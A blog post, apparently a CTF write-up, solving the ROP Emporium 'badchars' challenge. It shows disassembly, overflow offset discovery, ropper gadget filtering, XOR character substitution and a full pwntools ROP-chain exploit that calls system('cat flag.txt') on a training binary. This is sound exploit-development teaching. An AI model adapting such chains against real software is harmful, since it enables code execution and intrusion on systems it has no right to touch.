---
layout:     post
title:      'ROP Emporium - badchars'
date:       2019-02-11 0:00:00
author:     'W3ndige'
permalink: /:title/
category: 'ROP Emporium'
---

Today we're going to learn how to use different assembly instructions to help us write a string to a memory, with restriction that we can't use some characters. But with the knowledge from previous challenge, it shouldn't be much harder bypass these checks and get the flag.

```text
[w3ndige@main badchars]$ rabin2 -I badchars 
arch     x86
baddr    0x400000
binsz    7427
bintype  elf
bits     64
canary   false
sanitiz  false
class    ELF64
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
static   false
stripped false
subsys   linux
va       true
```

We can see that all security restrictions are present, so we can move forward with the binary as usual. Firstly, let's get the basic overview of how this challenge works by viewing it's disassembly.

```text
[w3ndige@main badchars]$ r2 -AAA badchars 
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Enable constraint types analysis for variables
 -- Toggle between disasm and graph with the space key
[0x00400790]> afl
0x00400698    3 26           sym._init
0x004006d0    1 6            sym.imp.free
0x004006e0    1 6            sym.imp.puts
0x004006f0    1 6            sym.imp.system
0x00400700    1 6            sym.imp.printf
0x00400710    1 6            sym.imp.memset
0x00400720    1 6            sym.imp.__libc_start_main
0x00400730    1 6            sym.imp.fgets
0x00400740    1 6            sym.imp.memcpy
0x00400750    1 6            sym.imp.malloc
0x00400760    1 6            sym.imp.setvbuf
0x00400770    1 6            sym.imp.exit
0x00400780    1 6            sub.__gmon_start_400780
0x00400790    1 41           entry0
0x004007c0    4 50   -> 41   sym.deregister_tm_clones
0x00400800    4 58   -> 55   sym.register_tm_clones
0x00400840    3 28           sym.__do_global_dtors_aux
0x00400860    4 38   -> 35   entry.init0
0x00400886    1 111          sym.main
0x004008f5    4 234          sym.pwnme
0x004009df    1 17           sym.usefulFunction
0x004009f0    7 80           sym.nstrlen
0x00400a40    9 158          sym.checkBadchars
0x00400b50    4 101          sym.__libc_csu_init
0x00400bc0    1 2            sym.__libc_csu_fini
0x00400bc4    1 9            sym._fini
```

With `afl` command we list all used functions. We can see those present from the previous challenges, but in addition we have `nstrlen` and `checkBadchars`, which probably check for restricted characters. Luckily for us, authors of the challenge don't want to spend much time disassembling and so, provide us with what characters cannot be present, while we run the binary. 

```text
Dealing with bad characters is frequently necessary in exploit development and you've probably had to deal with them before when encoding shellcode. Badchars are the reason that encoders such as shikata-ga-nai exist. Remember whilst constructing your ROP chain that the badchars apply to every character you use, not just parameters but addresses too. To mitigate the need for much RE the binary will list the badchars when you run it.
```

But we still can look at `pwnme` function, as that's our target. 

```text
/ (fcn) sym.pwnme 234S
|   sym.pwnme ();
|           ; var int local_30h @ rbp-0x30
|           ; var int local_28h @ rbp-0x28
|           ; CALL XREF from sym.main (0x4008df)
|           0x004008f5      55             push rbp
|           0x004008f6      4889e5         mov rbp, rsp
|           0x004008f9      4883ec30       sub rsp, 0x30               ; '0'
|           0x004008fd      48c745d00000.  mov qword [local_30h], 0
|           0x00400905      bf00020000     mov edi, 0x200              ; 512
|           0x0040090a      e841feffff     call sym.imp.malloc         ;  void *malloc(size_t size)
|           0x0040090f      488945d8       mov qword [local_28h], rax
|           0x00400913      488b45d8       mov rax, qword [local_28h]
|           0x00400917      4885c0         test rax, rax
|       ,=< 0x0040091a      7418           je 0x400934
|       |   0x0040091c      488b45d8       mov rax, qword [local_28h]
|       |   0x00400920      ba00020000     mov edx, 0x200              ; 512
|       |   0x00400925      be00000000     mov esi, 0
|       |   0x0040092a      4889c7         mov rdi, rax
|       |   0x0040092d      e8defdffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
|      ,==< 0x00400932      eb0a           jmp 0x40093e
|      ||   ; CODE XREF from sym.pwnme (0x40091a)
|      |`-> 0x00400934      bf01000000     mov edi, 1
|      |    0x00400939      e832feffff     call sym.imp.exit           ; void exit(int status)
|      |    ; CODE XREF from sym.pwnme (0x400932)
|      `--> 0x0040093e      488d45d0       lea rax, qword [local_30h]
|           0x00400942      4883c010       add rax, 0x10
|           0x00400946      ba20000000     mov edx, 0x20               ; 32
|           0x0040094b      be00000000     mov esi, 0
|           0x00400950      4889c7         mov rdi, rax
|           0x00400953      e8b8fdffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
|           0x00400958      bf080c4000     mov edi, str.badchars_are:_b_i_c____space__f_n_s ; 0x400c08 ; "badchars are: b i c / <space> f n s"
|           0x0040095d      e87efdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x00400962      bf2c0c4000     mov edi, 0x400c2c
|           0x00400967      b800000000     mov eax, 0
|           0x0040096c      e88ffdffff     call sym.imp.printf         ; int printf(const char *format)
|           0x00400971      488b15180720.  mov rdx, qword [obj.stdin__GLIBC_2.2.5] ; [0x601090:8]=0
|           0x00400978      488b45d8       mov rax, qword [local_28h]
|           0x0040097c      be00020000     mov esi, 0x200              ; 512
|           0x00400981      4889c7         mov rdi, rax
|           0x00400984      e8a7fdffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x00400989      488945d8       mov qword [local_28h], rax
|           0x0040098d      488b45d8       mov rax, qword [local_28h]
|           0x00400991      be00020000     mov esi, 0x200              ; 512
|           0x00400996      4889c7         mov rdi, rax
|           0x00400999      e852000000     call sym.nstrlen
|           0x0040099e      488945d0       mov qword [local_30h], rax
|           0x004009a2      488b55d0       mov rdx, qword [local_30h]
|           0x004009a6      488b45d8       mov rax, qword [local_28h]
|           0x004009aa      4889d6         mov rsi, rdx
|           0x004009ad      4889c7         mov rdi, rax
|           0x004009b0      e88b000000     call sym.checkBadchars
|           0x004009b5      488b55d0       mov rdx, qword [local_30h]
|           0x004009b9      488b45d8       mov rax, qword [local_28h]
|           0x004009bd      488d4dd0       lea rcx, qword [local_30h]
|           0x004009c1      4883c110       add rcx, 0x10
|           0x004009c5      4889c6         mov rsi, rax
|           0x004009c8      4889cf         mov rdi, rcx
|           0x004009cb      e870fdffff     call sym.imp.memcpy         ; void *memcpy(void *s1, const void *s2, size_t n)
|           0x004009d0      488b45d8       mov rax, qword [local_28h]
|           0x004009d4      4889c7         mov rdi, rax
|           0x004009d7      e8f4fcffff     call sym.imp.free           ; void free(void *ptr)
|           0x004009dc      90             nop
|           0x004009dd      c9             leave
\           0x004009de      c3             ret
```

From here we can see that after vulnerable `fgets()` call, we have these two new functions called. But what about `usefulFunction`? Is the system call still there?

```text
[0x00400790]> pdf @sym.usefulFunction
/ (fcn) sym.usefulFunction 17
|   sym.usefulFunction ();
|           0x004009df      55             push rbp
|           0x004009e0      4889e5         mov rbp, rsp
|           0x004009e3      bf2f0c4000     mov edi, str.bin_ls         ; 0x400c2f ; "/bin/ls"
|           0x004009e8      e803fdffff     call sym.imp.system         ; int system(const char *string)
|           0x004009ed      90             nop
|           0x004009ee      5d             pop rbp
\           0x004009ef      c3             ret
```

Yup, everything as usual. So what do we do now? Firstly, let's jump to `gdb` to find if the offset for overwriting `rsp` register. 

```text
gdb-peda$ pattern_create 512 input
Writing pattern of 512 chars to filename "input"
gdb-peda$ r < input
Starting program: /home/w3ndige/hacking/rop_emporium/badchars/badchars < input
badchars by ROP Emporium
64bits

badchars are: b i c / <space> f n s
> 
Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x602010 --> 0x0 
RDX: 0x0 
RSI: 0x1f 
RDI: 0x1ff 
RBP: 0x6141414541412941 ('A)AAEAAa')
RSP: 0x7fffffffdd48 ("AA0AAFAA\353AA1AAGAA\353AA2AAHAAdAA3AAIAAeAA4AAJAA\353AA5AAKAAgAA6AALAAhAA7AAMAA\353AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%\353A%BA%$A%\353A%CA%-A%(A%DA%;A%)A%EA%"...)
RIP: 0x4009de (<pwnme+233>:	ret)
R8 : 0x1 
R9 : 0x0 
R10: 0xfffffffffffff4c8 
R11: 0x7ffff7e57f20 (<free>:	endbr64)
R12: 0x400790 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffde30 ("%IA%eA%4A%JA%\353A%5A%KA%gA%6A%LA%hA%7A%MA%\353A%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zA\353%A\353\353A\353BA\353$A\353\353A\353CA\353-A\353(A\353DA\353;A\353)A\353EA\353aA\353\060A\353FA\353\353A\353\061A\353GA\353\353A\353\062A\353HA\353dA\353\063"...)
R14: 0x0 
R15: 0x0
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4009d7 <pwnme+226>:	call   0x4006d0 <free@plt>
   0x4009dc <pwnme+231>:	nop
   0x4009dd <pwnme+232>:	leave  
=> 0x4009de <pwnme+233>:	ret    
   0x4009df <usefulFunction>:	push   rbp
   0x4009e0 <usefulFunction+1>:	mov    rbp,rsp
   0x4009e3 <usefulFunction+4>:	mov    edi,0x400c2f
   0x4009e8 <usefulFunction+9>:	call   0x4006f0 <system@plt>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdd48 ("AA0AAFAA\353AA1AAGAA\353AA2AAHAAdAA3AAIAAeAA4AAJAA\353AA5AAKAAgAA6AALAAhAA7AAMAA\353AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%\353A%BA%$A%\353A%CA%-A%(A%DA%;A%)A%EA%"...)
0008| 0x7fffffffdd50 --> 0x41474141314141eb 
0016| 0x7fffffffdd58 --> 0x484141324141eb41 
0024| 0x7fffffffdd60 ("AAdAA3AAIAAeAA4AAJAA\353AA5AAKAAgAA6AALAAhAA7AAMAA\353AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%\353A%BA%$A%\353A%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%\353A%1A%GA%\353A%2A%"...)
0032| 0x7fffffffdd68 ("IAAeAA4AAJAA\353AA5AAKAAgAA6AALAAhAA7AAMAA\353AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%\353A%BA%$A%\353A%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%\353A%1A%GA%\353A%2A%HA%dA%3A"...)
0040| 0x7fffffffdd70 --> 0x354141eb41414a41 
0048| 0x7fffffffdd78 ("AAKAAgAA6AALAAhAA7AAMAA\353AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%\353A%BA%$A%\353A%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%\353A%1A%GA%\353A%2A%HA%dA%3A%IA%eA%4A%JA%\353A%"...)
0056| 0x7fffffffdd80 ("6AALAAhAA7AAMAA\353AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%\353A%BA%$A%\353A%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%\353A%1A%GA%\353A%2A%HA%dA%3A%IA%eA%4A%JA%\353A%5A%KA%gA"...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004009de in pwnme ()
gdb-peda$ pattern_search
Registers contain pattern buffer:
RBP+0 found at offset: 32
Registers point to pattern buffer:
[RSP] --> offset 40 - size ~221
[R13] --> offset 272 - size ~302
Pattern buffer found at:
0x00602268 : offset    8 - size    7 ([heap])
0x00602270 : offset   16 - size   32 ([heap])
0x00602291 : offset   49 - size    8 ([heap])
0x0060229a : offset   58 - size   26 ([heap])
0x006022b5 : offset   85 - size   26 ([heap])
0x006022d0 : offset  112 - size   95 ([heap])
0x00602330 : offset  208 - size    8 ([heap])
0x00602339 : offset  217 - size   32 ([heap])
0x0060235a : offset  250 - size    8 ([heap])
0x00602363 : offset  259 - size   26 ([heap])
0x0060237e : offset  286 - size   26 ([heap])
0x00602399 : offset  313 - size   91 ([heap])
0x00602470 : offset    0 - size  512 ([heap])
0x00007fffffffda2f : offset   95 - size   16 ($sp + -0x319 [-199 dwords])
0x00007fffffffda40 : offset   80 - size    4 ($sp + -0x308 [-194 dwords])
0x00007fffffffda60 : offset    0 - size    6 ($sp + -0x2e8 [-186 dwords])
0x00007fffffffda67 : offset    7 - size    8 ($sp + -0x2e1 [-185 dwords])
0x00007fffffffda70 : offset   16 - size   32 ($sp + -0x2d8 [-182 dwords])
0x00007fffffffda91 : offset   49 - size    8 ($sp + -0x2b7 [-174 dwords])
0x00007fffffffda9a : offset   58 - size    7 ($sp + -0x2ae [-172 dwords])
0x00007fffffffdd20 : offset    0 - size    6 ($sp + -0x28 [-10 dwords])
0x00007fffffffdd27 : offset    7 - size    8 ($sp + -0x21 [-9 dwords])
0x00007fffffffdd30 : offset   16 - size   32 ($sp + -0x18 [-6 dwords])
0x00007fffffffdd51 : offset   49 - size    8 ($sp + 0x9 [2 dwords])
0x00007fffffffdd5a : offset   58 - size   26 ($sp + 0x12 [4 dwords])
0x00007fffffffdd75 : offset   85 - size   26 ($sp + 0x2d [11 dwords])
0x00007fffffffdd90 : offset  112 - size   95 ($sp + 0x48 [18 dwords])
0x00007fffffffddf0 : offset  208 - size    8 ($sp + 0xa8 [42 dwords])
0x00007fffffffddf9 : offset  217 - size   32 ($sp + 0xb1 [44 dwords])
0x00007fffffffde1a : offset  250 - size    8 ($sp + 0xd2 [52 dwords])
0x00007fffffffde23 : offset  259 - size   26 ($sp + 0xdb [54 dwords])
0x00007fffffffde3e : offset  286 - size   26 ($sp + 0xf6 [61 dwords])
0x00007fffffffde59 : offset  313 - size   91 ($sp + 0x111 [68 dwords])
References to pattern buffer found at:
0x00007ffff7f90878 : 0x00602470 (/usr/lib/libc-2.28.so)
0x00007ffff7f90880 : 0x00602470 (/usr/lib/libc-2.28.so)
0x00007ffff7f90888 : 0x00602470 (/usr/lib/libc-2.28.so)
0x00007ffff7f90890 : 0x00602470 (/usr/lib/libc-2.28.so)
0x00007ffff7f90898 : 0x00602470 (/usr/lib/libc-2.28.so)
0x00007fffffffda10 : 0x00007fffffffda60 ($sp + -0x338 [-206 dwords])
```

From that information, we can see that `rsp` is still being overwritten after `40` bytes of input. To get more information about the bad characters, let's run the binary. 

```text
[w3ndige@main badchars]$ ./badchars 
badchars by ROP Emporium
64bits

badchars are: b i c / <space> f n s
> bic

Exiting
[w3ndige@main badchars]$ ./badchars 
badchars by ROP Emporium
64bits

badchars are: b i c / <space> f n s
> a

Exiting
```

Great, we have a nice list of restricted bytes. After converting them to hexadecimal values we get `0x62 0x69 0x63 0x2f 0x20 0x66 0x6e 0x73`. Remember that these characters can't be present in anything in our payload. Not in any address, not in any value that we put at the stack to be popped, not in the string that we want to place at memory. 

Now we can use `ropper` to get the list of all possible gadgets in the binary and with switch `-b`, we can pass our list of bad characters that this tool will interpret and ignore gadgets containing any element from that list. 

```text
[w3ndige@main badchars]$ ropper --file badchars -b 6269632f20666e73
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] filtering badbytes... 100%
[LOAD] removing double gadgets... 100%



Gadgets
=======


0x00000000004007e2: adc byte ptr [rax], ah; jmp rax; 
0x0000000000400bbf: add bl, dh; ret; 
0x0000000000400874: add byte ptr [rax - 0x7b], cl; sal byte ptr [rcx + rsi*8 + 0x55], 0x48; mov ebp, esp; call rax; 
0x0000000000400bbd: add byte ptr [rax], al; add bl, dh; ret; 
0x0000000000400872: add byte ptr [rax], al; add byte ptr [rax - 0x7b], cl; sal byte ptr [rcx + rsi*8 + 0x55], 0x48; mov ebp, esp; call rax; 
0x0000000000400bbb: add byte ptr [rax], al; add byte ptr [rax], al; add bl, dh; ret; 
0x0000000000400b28: add byte ptr [rax], al; add byte ptr [rax], al; add byte ptr [rax], al; add byte ptr [rax], al; xor byte ptr [r15], r14b; ret; 
0x0000000000400b2a: add byte ptr [rax], al; add byte ptr [rax], al; add byte ptr [rax], al; xor byte ptr [r15], r14b; ret; 
0x00000000004007ec: add byte ptr [rax], al; add byte ptr [rax], al; pop rbp; ret; 
0x0000000000400b2c: add byte ptr [rax], al; add byte ptr [rax], al; xor byte ptr [r15], r14b; ret; 
0x00000000004008e1: add byte ptr [rax], al; add byte ptr [rdi + 0x400bf9], bh; call 0x6e0; mov eax, 0; pop rbp; ret; 
0x00000000004006ab: add byte ptr [rax], al; add rsp, 8; ret; 
0x00000000004008e2: add byte ptr [rax], al; mov edi, 0x400bf9; call 0x6e0; mov eax, 0; pop rbp; ret; 
0x00000000004007ee: add byte ptr [rax], al; pop rbp; ret; 
0x0000000000400bc2: add byte ptr [rax], al; sub rsp, 8; add rsp, 8; ret; 
0x0000000000400b2e: add byte ptr [rax], al; xor byte ptr [r15], r14b; ret; 
0x0000000000400aab: add byte ptr [rax], bh; ret 0x1075; 
0x00000000004008e3: add byte ptr [rdi + 0x400bf9], bh; call 0x6e0; mov eax, 0; pop rbp; ret; 
0x0000000000400854: add eax, 0x20084e; add ebx, esi; ret; 
0x0000000000400859: add ebx, esi; ret; 
0x00000000004006ae: add esp, 8; ret; 
0x00000000004006ad: add rsp, 8; ret; 
0x0000000000400857: and byte ptr [rax], al; add ebx, esi; ret; 
0x00000000004009d7: call 0x6d0; nop; leave; ret; 
0x00000000004008e9: call 0x6e0; mov eax, 0; pop rbp; ret; 
0x00000000004009e8: call 0x6f0; nop; pop rbp; ret; 
0x00000000004006a8: call 0x780; add rsp, 8; ret; 
0x0000000000400d6b: call qword ptr [rax]; 
0x0000000000400885: call qword ptr [rbp + 0x48]; 
0x0000000000400d4b: call qword ptr [rcx]; 
0x000000000040087e: call rax; 
0x0000000000400b9c: fmul qword ptr [rax - 0x7d]; ret; 
0x0000000000400dab: jmp qword ptr [rbp]; 
0x00000000004007e5: jmp rax; 
0x0000000000400851: lcall ptr [rbp - 0x3a]; add eax, 0x20084e; add ebx, esi; ret; 
0x0000000000400b35: mov dword ptr [rbp], esp; ret; 
0x00000000004008ee: mov eax, 0; pop rbp; ret; 
0x00000000004009d1: mov eax, dword ptr [rbp - 0x28]; mov rdi, rax; call 0x6d0; nop; leave; ret; 
0x0000000000400a3b: mov eax, dword ptr [rbp - 8]; pop rbp; ret; 
0x000000000040087c: mov ebp, esp; call rax; 
0x00000000004009e1: mov ebp, esp; mov edi, 0x400c2f; call 0x6f0; nop; pop rbp; ret; 
0x00000000004008e4: mov edi, 0x400bf9; call 0x6e0; mov eax, 0; pop rbp; ret; 
0x00000000004009e3: mov edi, 0x400c2f; call 0x6f0; nop; pop rbp; ret; 
0x00000000004007e0: mov edi, 0x601080; jmp rax; 
0x00000000004009d5: mov edi, eax; call 0x6d0; nop; leave; ret; 
0x0000000000400b34: mov qword ptr [r13], r12; ret; 
0x00000000004009d0: mov rax, qword ptr [rbp - 0x28]; mov rdi, rax; call 0x6d0; nop; leave; ret; 
0x0000000000400a3a: mov rax, qword ptr [rbp - 8]; pop rbp; ret; 
0x000000000040087b: mov rbp, rsp; call rax; 
0x00000000004009e0: mov rbp, rsp; mov edi, 0x400c2f; call 0x6f0; nop; pop rbp; ret; 
0x00000000004009d4: mov rdi, rax; call 0x6d0; nop; leave; ret; 
0x00000000004007e8: nop dword ptr [rax + rax]; pop rbp; ret; 
0x0000000000400835: nop dword ptr [rax]; pop rbp; ret; 
0x00000000004007e7: nop word ptr [rax + rax]; pop rbp; ret; 
0x00000000004008e6: or eax, dword ptr [rax]; call 0x6e0; mov eax, 0; pop rbp; ret; 
0x0000000000400bac: pop r12; pop r13; pop r14; pop r15; ret; 
0x0000000000400b3b: pop r12; pop r13; ret; 
0x0000000000400bae: pop r13; pop r14; pop r15; ret; 
0x0000000000400b3d: pop r13; ret; 
0x0000000000400b40: pop r14; pop r15; ret; 
0x0000000000400b42: pop r15; ret; 
0x00000000004007df: pop rbp; mov edi, 0x601080; jmp rax; 
0x0000000000400bab: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
0x0000000000400baf: pop rbp; pop r14; pop r15; ret; 
0x00000000004007f0: pop rbp; ret; 
0x0000000000400b39: pop rdi; ret; 
0x0000000000400b41: pop rsi; pop r15; ret; 
0x0000000000400bad: pop rsp; pop r13; pop r14; pop r15; ret; 
0x0000000000400b3c: pop rsp; pop r13; ret; 
0x000000000040087a: push rbp; mov rbp, rsp; call rax; 
0x0000000000400aad: ret 0x1075; 
0x00000000004006a9: rol dword ptr [rax], cl; add byte ptr [rax], al; add rsp, 8; ret; 
0x0000000000400ad7: sal byte ptr [r10 - 0x55], 1; nop; pop rbp; ret; 
0x0000000000400877: sal byte ptr [rcx + rsi*8 + 0x55], 0x48; mov ebp, esp; call rax; 
0x0000000000400ad8: sal byte ptr [rdx - 0x55], 1; nop; pop rbp; ret; 
0x0000000000400ada: stosd dword ptr [rdi], eax; nop; pop rbp; ret; 
0x0000000000400bc5: sub esp, 8; add rsp, 8; ret; 
0x0000000000400bc4: sub rsp, 8; add rsp, 8; ret; 
0x00000000004007ea: test byte ptr [rax], al; add byte ptr [rax], al; add byte ptr [rax], al; pop rbp; ret; 
0x0000000000400b30: xor byte ptr [r15], r14b; ret; 
0x0000000000400b31: xor byte ptr [rdi], dh; ret; 
0x0000000000400a3d: clc; pop rbp; ret; 
0x0000000000400879: int1; push rbp; mov rbp, rsp; call rax; 
0x00000000004009dd: leave; ret; 
0x00000000004009ed: nop; pop rbp; ret; 
0x00000000004009dc: nop; leave; ret; 
0x00000000004006b1: ret; 
0x00000000004008e5: stc; or eax, dword ptr [rax]; call 0x6e0; mov eax, 0; pop rbp; ret; 
```

And with this last step, we have all information to prepare our attack. Firstly, we're going to use previously created function to pass the string into memory. These gadgets - `0x0000000000400b34: mov qword ptr [r13], r12; ret;` and `0x0000000000400b3b: pop r12; pop r13; ret;` will work just as the ones used in previous challenge. But we can't pass the string `cat flag.txt` just as it is because of the restricted chars.


But with this gadget `0x0000000000400b30: xor byte ptr [r15], r14b; ret;` we can XOR any value from memory with byte provided in `r14` register. So we can easily brute force a pair - printable character that will go into our string as substitute, some byte that XORed together will produce a letter that should be in a string, but is restricted. 

Let's write a simple python script for that. 

```python
>>> import string
>>> for x in string.printable:
...     for y in range(16):
...             if chr(ord(x) ^ y) == 'c':
...                     print(x + ' ' + str(y))
... 
a 2
b 1
c 0
d 7
e 6
f 5
g 4
h 11
i 10
j 9
k 8
l 15
m 14
n 13
o 12
` 3
```

As you can see, we have a lot of pairs that we can xor together to produce `c` letter. So if we have `cat flag.txt`, we can substitute `a` for `c` and then xor that place at memory with `2`, producing what we want, letter `c`. 

Now let's create an attack plan.

* Use our function from previous challenge to place string `aat!alag.txt`, with restricted characters replaced by the ones that we can change with xor. 
* Use `pop` gadget to `pop` the address of a restricted character in string and a byte to xor the character with, producing correct character.
* Repeat for all characters.
* Use `pop` to get the address of string into `rdi` register.
* Call `system()` and get the flag. 

And here comes the time to write our exploit.

```python
from pwn import *

# 0x0000000000400b34: mov qword ptr [r13], r12; ret; 
# 0x0000000000400b3b: pop r12; pop r13; ret; 
# 0x0000000000400b39: pop rdi; ret; 
# 0x0000000000400b30: xor byte ptr [r15], r14b; ret; 
# 0x0000000000400b40: pop r14; pop r15; ret; 

#   [25] .data             PROGBITS         0000000000601070  00001070
#        0000000000000010  0000000000000000  WA       0     0     8

# cat flag.txt

def place_string_at_address(mov_gadget_address, pop_gadget_address, string_address, string):

     # We have to remember that the length of the string has to be
     # divisibe by eight to make the padding in payload correct.
     while len(string) % 8 != 0:
          string += "\x00"

     # This time popped values are reversed, first comes the string, then the address
     splitted_string = [string[i:i + 8] for i in range(0, len(string), 8)]
     payload = ""
     for i in range(len(splitted_string)):
        
          # Place the gadgets into the payload.
          payload += p64(pop_gadget_address)
          payload += splitted_string[i]
          payload += p64(string_address + (i * 8)) # We have to increment address in order
                                                   # to not overwrite previous strings.
          payload += p64(mov_gadget_address)

     return payload

offset = 'A' * 40

offset += place_string_at_address(0x400b34, 0x400b3b, 0x601071, "aat!alag.txt")

# Now we're XORing values from string.
# 2 ^ 'a' = 'c' 
offset += p64(0x0000000000400b40)
offset += p64(0x2)
offset += p64(0x601071)
offset += p64(0x0000000000400b30)

# 1 ^ '!' = ' '
# String address is 0x601071 because if we would have 0x601070
# address of second XORed character would end with 0x73, which
# is restricted.
offset += p64(0x0000000000400b40)
offset += p64(0x1)
offset += p64(0x601074)
offset += p64(0x0000000000400b30)

# 7 ^ 'a' = 'f'
offset += p64(0x0000000000400b40)
offset += p64(0x7)
offset += p64(0x601075)
offset += p64(0x0000000000400b30)

# Pop address of string into RDI and call system()
offset += p64(0x0000000000400b39)
offset += p64(0x601071)
offset += p64(0x004009e8)

print(offset)
```

Will it work?

```text
[w3ndige@main badchars]$ python2 exploit.py | ./badchars 
badchars by ROP Emporium
64bits

badchars are: b i c / <space> f n s
> ROPE{a_placeholder_32byte_flag!}
Segmentation fault (core dumped)
```